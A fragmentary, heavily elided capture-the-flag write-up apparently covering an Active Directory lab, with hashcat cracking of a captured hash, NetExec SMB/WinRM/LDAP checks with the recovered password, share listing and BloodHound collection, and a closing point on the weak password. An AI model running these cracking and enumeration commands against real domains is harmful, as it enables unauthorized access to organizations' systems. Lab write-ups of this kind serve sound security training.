...
flowchart TD
    ...
    F --> G[Crack hash with hashcat<br/>svc.scanner : 1summerlove!]
...
[*] svc.scanner::CTF:aaaaaaaaaaaaaaaa:87b0784491399d96e72a746b29234b21:<...hash truncated...>
```
...
```bash
SVC.SCANNER::CTF:...<hash>...:1summerlove!
...
`nxc smb 10.114.135.83 -u svc.scanner -p '1summerlove!'`

```bash
SMB  DC01  [+] ctf.local\svc.scanner:1summerlove!
```

`nxc smb 10.114.135.83 -u svc.scanner -p '1summerlove!' --shares`
...
`nxc winrm 10.114.135.83 -u svc.scanner -p '1summerlove!'`

```bash
WINRM  DC01  [-] ctf.local\svc.scanner:1summerlove!
```
...
`bloodhound-python -u svc.scanner -p '1summerlove!' -d ctf.local -ns 10.114.135.83 -c All --zip`
...
`nxc ldap 10.114.135.83 -u svc.scanner -p '1summerlove!' --query "(samaccountname=svc.scanner)" "msDS-AllowedToDelegateTo"`

```bash
LDAP  DC01  [+] ctf.local\svc.scanner:1summerlove!
...
4. **Weak password** — `svc.scanner`'s password (`1summerlove!`) was recoverable from `rockyou.txt` in under 30 seconds.
